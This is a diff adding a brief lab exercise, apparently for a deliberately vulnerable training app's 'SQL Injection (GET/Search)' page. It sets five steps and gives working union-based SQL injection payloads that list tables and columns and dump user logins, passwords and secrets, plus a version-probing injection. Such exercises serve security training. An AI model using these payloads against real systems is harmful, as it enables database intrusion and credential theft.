@@ -1,0 +1,26 @@
+SQL Injection (GET/Search)
+1) Select in list “SQL Injection (GET/Search)”
+
+2) Find out if SQL injection attack can be done on this site
+
+3) Using SQL injection find tables on database
+
+4) Find column names from user table
+
+5) Show information about users
+
+
+3) m' union all select 1,table_name,3,4,5,6,7 from
+information_schema.tables where table_schema=database()
+-- -
+
+4) m' union all select 1,column_name,3,4,5,6,7 from
+information_schema.columns where table_name='users' and
+table_schema=database() -- -
+
+5) m' union all select 1,login,password,secret,5,6,7 from
+users -- -0
+
+
+2.  test’ or substring(@@version,1,1)=4#
+
